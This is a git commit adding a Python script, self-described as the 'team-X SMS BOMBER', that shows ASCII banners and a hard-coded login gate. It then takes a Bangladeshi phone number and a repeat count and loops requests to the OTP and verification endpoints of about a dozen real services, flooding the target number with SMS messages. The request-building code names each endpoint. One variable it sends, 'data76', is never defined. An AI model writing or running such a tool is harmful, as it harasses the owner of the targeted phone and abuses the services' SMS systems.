fb16e1624b66e7c262b4e6a96f1465c79bb33e3b
Cyber Hanter Bangladesh <90473753+CyberHanterBangladesh@users.noreply.github.com>
2022-01-18 23:20:16 +0600

    Add files via upload

---
+++ hhhh.py
@@ -0,0 +1,248 @@
+import sys,os,time,random
+import requests
+from requests.structures import CaseInsensitiveDict
+blue= '\33[94m'
+lightblue = '\033[94m'
+red = '\033[91m'
+white = '\33[97m'
+yellow = '\33[93m'
+green = '\033[1;32m'
+cyan  = "\033[96m"
+end = '\033[0m'
+black="\033[0;30m"
+blue= '\33[94m'
+lightblue = '\033[94m'
+red = '\033[91m'
+white = '\33[97m'
+yellow = '\33[93m'
+green = '\033[1;32m'
+cyan  = "\033[96m"
+end = '\033[0m'
+black="\033[0;30m"
+pink="\x1b[95m"
+blue="\x1b[94m"
+underline='\x1b[4m'
+colouroff="\x1b[00m"
+os.system("clear")
+print("")
+print("")
+color = ["\033[1;31m","\033[1;32m", "\033[96m", '\33[93m' '\33[94m']
+n = random.choice(color)+"""
+████████╗██╗  ██╗███████╗
+╚══██╔══╝╚██╗██╔╝╚══███╔╝
+   ██║    ╚███╔╝   ███╔╝ 
+   ██║    ██╔██╗  ███╔╝  
+   ██║   ██╔╝ ██╗███████╗
+   ╚═╝   ╚═╝  ╚═╝╚══════╝
+   \n"""
+for msg in n:
+    sys.stdout.write(msg)
+    sys.stdout.flush()
+    time.sleep(0.0001)
+print("")
+x=3
+while x<5:
+     user=str(input(green+"\nEnter Tool Username : "))
+     
+     if user=="team-X":
+      os.system("clear")
+      
+      
+      
+      
+      color = ["\033[1;31m","\033[1;32m", "\033[96m", '\33[93m' '\33[94m']
+      m = random.choice(color)+"""
+  _______ ______          __  __     __   __
+ |__   __|  ____|   /\   |  \/  |    \ \ / /
+    | |  | |__     /  \  | \  / |_____\ V / 
+    | |  |  __|   / /\ \ | |\/| |______> <  
+    | |  | |____ / ____ \| |  | |     / . \ 
+    |_|  |______/_/    \_\_|  |_|    /_/ \_\
+   """
+   
+      
+      for msg in m:
+          sys.stdout.write(msg)
+          sys.stdout.flush()
+          time.sleep(0.0001)
+      
+      x=8
+      
+      
+    
+     else:
+       os.system('xdg-open https://facebook.com/groups/team.x.official.community')
+       x=3
+      
+     
+x=4
+
+while x<6:
+     
+     
+     passw=str(input(green+"\n\nEnterTool Password:  "))
+     
+     if passw=="love":
+      os.system("clear")
+      color = ["\033[1;31m","\033[1;32m", "\033[96m", '\33[93m' '\33[94m']
+      j = random.choice(color)+"""
+████████╗██╗  ██╗███████╗
+╚══██╔══╝╚██╗██╔╝╚══███╔╝
+   ██║    ╚███╔╝   ███╔╝ 
+   ██║    ██╔██╗  ███╔╝  
+   ██║   ██╔╝ ██╗███████╗
+   ╚═╝   ╚═╝  ╚═╝╚══════╝
+   \n"""
+      for msg in j:
+          sys.stdout.write(msg)
+          sys.stdout.flush()
+          time.sleep(0.0001)
+          
+      
+   
+      color = ["\033[1;31m","\033[1;32m", "\033[96m", '\33[93m' '\33[94m']
+      l = random.choice(color)+"\n\nLoing successful "
+      for msg in l:
+          sys.stdout.write(msg)
+          sys.stdout.flush()
+          time.sleep(0.01)
+      
+      os.system('xdg-open https://facebook.com/groups/team.x.official.community')
+     
+
+      x=10
+      os.system("clear")
+     else:
+         
+     
+      
+      os.system('xdg-open https://www.facebook.com/105088322048897')
+      x=4
+
+os.system("clear")
+print(yellow+"\n\n< ━━━━━━━ [★] "+green+"Focous on Your Aim, You Will winner"+yellow+" [★]━━━━━━ >")
+
+print("")
+print("")
+color = ["\033[1;31m","\033[1;32m", "\033[96m", '\33[93m' '\33[94m']
+q = random.choice(color)+"""
+  _______ ______          __  __     __   __
+ |__   __|  ____|   /\   |  \/  |    \ \ / /
+    | |  | |__     /  \  | \  / |_____\ V / 
+    | |  |  __|   / /\ \ | |\/| |______> <  
+    | |  | |____ / ____ \| |  | |     / . \ 
+    |_|  |______/_/    \_\_|  |_|    /_/ \_\
+ \n"""
+for msg in q:
+    sys.stdout.write(msg)
+    sys.stdout.flush()
+    time.sleep(0.01)
+print("")
+
+print(yellow+"\n\n         < ━━━━━━━ [★] "+green+"Information And Technology"+yellow+" [★]━━━━━━ >")
+
+
+number=str(input(red+"\n\n\n[➙] Enter Your Number [>]+880"))
+amount=int(input(cyan+"[➙] Enter The Amount [>]"))
+
+url1 = "https://ss.binge.buzz/otp/send/login"
+
+headers1 = CaseInsensitiveDict()
+headers1["Content-Type"] = "application/x-www-form-urlencoded"
+
+data1 = "phone=0"+number
+
+
+
+
+
+
+url2 = "https://stage.bioscopelive.com/en/login/send-otp?phone=880"+number+"&operator=bd-otp"
+
+url3 = "https://xrides.shohoz.com/api/v2/user/send-mobile-verification-code"
+
+headers3 = CaseInsensitiveDict()
+headers3["Content-Type"] = "application/json"
+
+data3 = '{\"mobile\":\"0'+number+'\"}'
+
+url4 = "https://addabaji.mobi/twocups-v1-robi/otp.php"
+
+headers4 = CaseInsensitiveDict()
+headers4["Content-Type"] = "application/x-www-form-urlencoded"
+
+data4 = "msisdn=0"+number
+
+url5 = "https://developer.quizgiri.xyz/api/v2.0/send-otp"
+headers5 = CaseInsensitiveDict()
+headers5["Content-Type"] = "application/json"
+
+data5 = '{"phone":"0'+number+'","country_code":"+880","fcm_token":null}'
+url = "https://api-v4-1.hungrynaki.com/graphql"
+
+data = {'query': '\nmutation CreateOtp (\n    $phone: PhoneNumber!\n    $country: String!\n    $uuid: String!\n    $osVersionCode: String\n    $deviceBrand: String\n    $deviceModel: String\n    $requestFrom: String\n) {\n    createOtp(\n        auth: {\n            phone: $phone,\n            countryCode: $country,\n            deviceUuid: $uuid,\n            deviceToken: ""\n        }\n        device: {\n            deviceType: WEB\n            osVersionCode: $osVersionCode\n            deviceBrand: $deviceBrand\n            deviceModel: $deviceModel\n        }\n        requestFrom: $requestFrom\n    ){\n        statusCode\n    }\n}\n', 'variables': {'phone': number, 'country': '880', 'uuid': '64b9bb81-93f3-4757-9e92-9cfbf34d8039', 'osVersionCode': 'Linux armv8l', 'deviceBrand': 'Chrome', 'deviceModel': '89', 'requestFrom': 'U2FsdGVkX18QITR3WakOCR2OK+zoIpqM7DqxiLf915s='}}
+
+
+
+
+
+
+url9 = "https://lms.10minuteschool.com/api/v4/auth/sendOtp"
+
+headers9 = CaseInsensitiveDict()
+headers9["Content-Type"] = "application/json"
+
+data9 = '{"phone":{"number":"'+number+'","internationalNumber":"+880 '+number+'","nationalNumber":"'+number+'","e164Number":"+880'+number+'","countryCode":"BD","dialCode":"+880"},"contact":"+880'+number+'","type":"phone"}'
+
+url7= "https://u.icq.net/api/v70/rapi/auth/sendCode"
+headers12 = CaseInsensitiveDict()
+headers12["Content-Type"] = "application/json"
+data12 = '{"reqId":"3815-1639886448","params":{"phone":"880'+number+'","language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}}'
+
+api="https://students.byjus.com/mobiles/request_otp?mobile=%2B880-"+number
+url13= "https://api.redx.com.bd/v1/user/signup"
+
+headers13= CaseInsensitiveDict()
+headers13["Content-Type"] = "application/json"
+
+data13= '{"name":"'+number+'","phoneNumber":"'+number+'","service":"redx"}'
+
+url10 = "https://fundesh.com.bd/api/auth/generateOTP?service_key="
+
+headers10 = CaseInsensitiveDict()
+headers10["Content-Type"] = "application/json"
+
+data10 = '{"msisdn":"'+number+'"}'
+ff=("https://www.shwapno.com/WebAPI/CRMActivation/Validate?Channel=W&otpCRMrequired=false&otpeCOMrequired=true&smssndcnt=8&otpBasedLogin=false&LoyaltyProvider=&MobileNO=0"+number+"&countryPhoneCode=%2B88&Format=html")
+url76 = "https://auth.dhamakashopping.com/api/otp"
+
+headers76 = CaseInsensitiveDict()
+headers76 ["Content-Type"] = "application/json"
+
+data = '{"phoneNumber":"+880'+number+'"}'
+
+for i in range (amount):
+        resp7= requests.post(url7, headers=headers12, data=data12)
+        resp = requests.post(url, json=data)
+        resp9 = requests.post(url9, headers=headers9, data=data9)
+        resp1 = requests.post(url1, headers=headers1, data=data1)
+        resp3 = requests.get(url2)
+        resp4 = requests.post(url3, headers=headers3,data=data3)
+        resp5 = requests.post(url4, headers=headers4, data=data4)
+        resp6 = requests.post(url5, headers=headers5, data=data5)
+        resp6 = requests.get(api)
+        resp9= requests.post(url13, headers=headers13, data=data13)
+        resp10 = requests.post(url10, headers=headers10, data=data10)
+        resp17 = requests.get(ff)
+        resp76 = requests.post(url76, headers=headers76, data=data76)
+
+
+
+
+
+print(green+'\n\n ➙Success Sms  Sand ⏳⌛')
+time.sleep(3)
+
+
+print(cyan+'\t\tThanks For Using  team-X SMS BOMBER  ')
+
